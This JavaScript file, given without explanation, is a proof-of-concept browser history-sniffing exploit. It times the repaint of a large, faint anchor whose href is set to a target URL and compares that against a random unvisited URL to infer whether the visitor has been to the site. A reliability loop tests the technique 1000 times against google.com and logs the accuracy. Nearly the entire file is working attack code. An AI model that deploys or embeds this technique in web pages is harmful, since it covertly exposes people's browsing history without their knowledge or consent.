const createanchor = () => {
  const anchor = document.createElement('a')
  anchor.innerText = 'a '.repeat(0x1000)
  anchor.style.position = 'absolute'
  anchor.style.top = 0
  anchor.style.color = '#88888888'
  return anchor
}

const measure = async (anchor, url) => {
  let s, e
  await new Promise(resolve => {
    window.requestAnimationFrame(_ => {
      anchor.href = url
      s = performance.now()
      window.requestIdleCallback(_ => {
        e = performance.now()
        resolve()
      })
    })
  })
  return e - s
}

const checkifvisited = async url => {
  const anchor = createanchor()
  document.body.appendChild(anchor)
  await measure(anchor, '')
  const d1 = await measure(anchor, url)
  const d2 = await measure(anchor, url + performance.now())
  anchor.remove()
  return d1 < d2
}

const checkreliability = async () => {
  let i = 0, j = 0
  for (; i< 1000; i++) {
    if (!await checkifvisited('https://www.google.com')) j++
    if (await checkifvisited('https://www.google.com/' + performance.now())) j++
  }
  const result = (1 - j/(i*2)) * 100 + '%'
  console.log(result)
}
